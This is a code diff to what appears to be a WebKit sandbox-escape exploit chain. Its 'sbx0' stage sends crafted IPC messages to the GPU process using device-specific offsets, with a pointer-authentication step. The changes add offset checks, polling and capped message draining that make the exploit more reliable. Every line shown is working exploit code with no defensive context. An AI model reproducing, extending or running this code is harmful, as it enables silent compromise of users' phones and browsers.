@@ -6590,8 +6590,16 @@
 });
 
   var MessageName = sbx0_offsets[device_model];
+  if (!MessageName) {
+    log('sbx0: missing MessageName offsets for device_model=' + device_model + ' known=' + Object.keys(sbx0_offsets).join(','));
+    return false;
+  }
   function LOG(msg) {
     log('sbx0: ' + msg);
+  }
+  function sleep(ms) {
+    const begin = Date.now();
+    while (Date.now() - begin < ms);
   }
   const MACH_MSG_TYPE_MOVE_SEND = 0x11;
   const MACH_MSGH_BITS_COMPLEX = 0x80000000;
@@ -7162,6 +7170,28 @@
   }
   (function SBX0() {
     LOG(`[+] SBX0() (retry: ${retry_count++})`);
+    function waitForGpuValue(label, readFn, predicate, timeout = 5000, poll_ms = 10) {
+      const start = Date.now();
+      let value;
+      while (Date.now() - start < timeout) {
+        value = readFn();
+        if (predicate(value)) {
+          return value;
+        }
+        if (poll_ms) sleep(poll_ms);
+      }
+      LOG(`[!] timeout waiting for ${label}, last=${typeof value === 'bigint' ? value.hex() : value}`);
+      return undefined;
+    }
+    function drainConnectionMessages(connection, label) {
+      let count = 0;
+      while (count < 256 && connection.tryConsumeMessage()) {
+        count++;
+      }
+      if (count == 256) {
+        LOG(`[!] stopped draining ${label} after ${count} messages`);
+      }
+    }
     function GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection) {
       gpuConnection.sendMessage(new Encoder(MessageName.GPUConnectionToWebProcess_CreateRenderingBackend, 0n).encode('uint64_t', backendConnection.identifier).encode('uint64_t', backendConnection.buffer.size), [backendConnection.receivePort, backendConnection.buffer.port]);
       const decoders = backendConnection.receiveMessages([MessageName.RemoteRenderingBackendProxy_DidInitialize, MessageName.InitializeConnection]);
@@ -8577,10 +8607,10 @@
       }
       for (let i = 0; i < renderingBackendConnections.length; ++i) {
         const renderingBackendConnection = renderingBackendConnections[i];
-        while (renderingBackendConnection.tryConsumeMessage());
+        drainConnectionMessages(renderingBackendConnection, `renderingBackendConnection[${i}]`);
       }
-      while (firstGpuConnection.tryConsumeMessage());
-      while (gpuConnection.tryConsumeMessage());
+      drainConnectionMessages(firstGpuConnection, 'firstGpuConnection');
+      drainConnectionMessages(gpuConnection, 'gpuConnection');
       const sbx0_pac_end = Date.now();
       log(`[profiler] sbx0 (pac) took ${sbx0_pac_end - sbx0_pac_begin} ms`);
       LOG(`[+] SBX0 complete`);
